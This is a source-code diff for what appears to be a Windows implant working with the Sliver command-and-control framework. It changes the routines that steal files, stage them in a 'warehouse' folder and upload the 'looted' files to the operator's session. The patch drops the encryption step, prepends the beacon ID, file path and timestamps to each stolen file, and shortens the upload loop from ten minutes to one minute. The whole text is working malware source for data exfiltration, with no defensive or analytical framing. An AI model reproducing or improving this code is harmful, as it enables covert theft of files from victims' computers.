@@ -1566,11 +1566,11 @@ VOID CopyFileToWarehouse
 	FILETIME LastAccessTime;
 	FILETIME LastWriteTime;
 	LPSTR lpConvertedPath = NULL;
-	CHAR szFileInfo[0x400];
 	SYSTEMTIME CreationSystemTime;
 	SYSTEMTIME LastAccessSystemTime;
 	SYSTEMTIME LastWriteSystemTime;
-	LPWSTR lpInfoPath = NULL;
+	PBYTE pPlainText = NULL;
+	DWORD cbPlainText = 0;
 
 	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
@@ -1614,37 +1614,29 @@ VOID CopyFileToWarehouse
 		goto CLEANUP;
 	}
 
-	Rc4EncryptDecrypt(pFileData, cbFileData, pConfig->lpRecipientPubKey, lstrlenA(pConfig->lpRecipientPubKey));
+	pPlainText = ALLOC(0x200 + cbFileData);
+	lpConvertedPath = ConvertWcharToChar(lpPath);
+	FileTimeToSystemTime(&CreationTime, &CreationSystemTime);
+	FileTimeToSystemTime(&LastAccessTime, &LastAccessSystemTime);
+	FileTimeToSystemTime(&LastWriteTime, &LastWriteSystemTime);
+	wsprintfA(pPlainText, "Session/Beacon ID: %s\nFile path: %s\nCreation time: %d/%d/%d %d:%d:%d\nLast access time: %d/%d/%d %d:%d:%d\nLast write time: %d/%d/%d %d:%d:%d", pConfig->szSessionID, lpConvertedPath, CreationSystemTime.wDay, CreationSystemTime.wMonth, CreationSystemTime.wYear, CreationSystemTime.wHour, CreationSystemTime.wMinute, CreationSystemTime.wSecond, LastAccessSystemTime.wDay, LastAccessSystemTime.wMonth, LastAccessSystemTime.wYear, LastAccessSystemTime.wHour, LastAccessSystemTime.wMinute, LastAccessSystemTime.wSecond, LastWriteSystemTime.wDay, LastWriteSystemTime.wMonth, LastWriteSystemTime.wYear, LastWriteSystemTime.wHour, LastWriteSystemTime.wMinute, LastWriteSystemTime.wSecond);
+	memcpy(&pPlainText[0x200], pFileData, cbFileData);
 	lpFileName = PathFindFileNameW(lpPath);
 	lpTemp = ConvertWcharToChar(lpFileName);
 	pNameDigest = ComputeSHA256(lpTemp, lstrlenA(lpTemp));
 	lpNameHexDigest = ConvertBytesToHexW(pNameDigest, SHA256_HASH_SIZE);
 	lpNameHexDigest[SHA256_HASH_SIZE] = L'\0';
-	if (lpWarehouse[lstrlenW(lpWarehouse) - 1] != L'\\') {
-		lstrcatW(lpWarehouse, L"\\");
-	}
-
+	lstrcatW(lpWarehouse, L"\\");
 	lstrcatW(lpWarehouse, lpNameHexDigest);
-	lpInfoPath = DuplicateStrW(lpWarehouse, 32);
-	lstrcatW(lpInfoPath, L"_INFO.txt");
-	if (!WriteToFile(lpWarehouse, pFileData, cbFileData)) {
-		goto CLEANUP;
-	}
-
-	lpConvertedPath = ConvertWcharToChar(lpPath);
-	FileTimeToSystemTime(&CreationTime, &CreationSystemTime);
-	FileTimeToSystemTime(&LastAccessTime, &LastAccessSystemTime);
-	FileTimeToSystemTime(&LastWriteTime, &LastWriteSystemTime);
-	wsprintfA(szFileInfo, "Session/Beacon ID: %s\nFile path: %s\nCreation time: %d/%d/%d %d:%d:%d\nLast access time: %d/%d/%d %d:%d:%d\nLast write time: %d/%d/%d %d:%d:%d", pConfig->szSessionID, lpConvertedPath, CreationSystemTime.wDay, CreationSystemTime.wMonth, CreationSystemTime.wYear, CreationSystemTime.wHour, CreationSystemTime.wMinute, CreationSystemTime.wSecond, LastAccessSystemTime.wDay, LastAccessSystemTime.wMonth, LastAccessSystemTime.wYear, LastAccessSystemTime.wHour, LastAccessSystemTime.wMinute, LastAccessSystemTime.wSecond, LastWriteSystemTime.wDay, LastWriteSystemTime.wMonth, LastWriteSystemTime.wYear, LastWriteSystemTime.wHour, LastWriteSystemTime.wMinute, LastWriteSystemTime.wSecond);
-	if (!WriteToFile(lpInfoPath, szFileInfo, lstrlenA(szFileInfo))) {
+	if (!WriteToFile(lpWarehouse, pPlainText, cbFileData + 0x200)) {
 		goto CLEANUP;
 	}
 
 CLEANUP:
-	FREE(lpInfoPath);
 	FREE(lpConvertedPath);
 	FREE(lpWarehouse);
 	FREE(pFileData);
+	FREE(pPlainText);
 	FREE(lpTemp);
 	FREE(pNameDigest);
 	FREE(lpNameHexDigest);
@@ -1713,6 +1705,7 @@ BOOL StealFile
 					break;
 				}
 
+				PrintFormatW(L"Zip path: %s\n", lpPath);
 				ItemList = ExtractFromZip(lpPath, NULL, FALSE, &dwNumberOfItems);
 				if (ItemList == NULL) {
 					continue;
@@ -1918,6 +1911,7 @@ BOOL UploadLootedFileCallback
 	Envelope.pData = BufferMove(pFileData, cbFileData);
 	pFileData = NULL;
 	pSession->Send(pSession->pGlobalConfig, pSession->lpClient, &Envelope);
+	Sleep(500);
 CLEANUP:
 	FreeBuffer(Envelope.pData);
 	return FALSE;
@@ -1947,7 +1941,7 @@ VOID SliverUploadLootedFile
 
 	while (TRUE) {
 		ListFileEx(lpWarehouse, LIST_JUST_FILE, UploadLootedFileCallback, pSession);
-		Sleep(600000);
+		Sleep(60000);
 	}
 CLEANUP:
 	return;
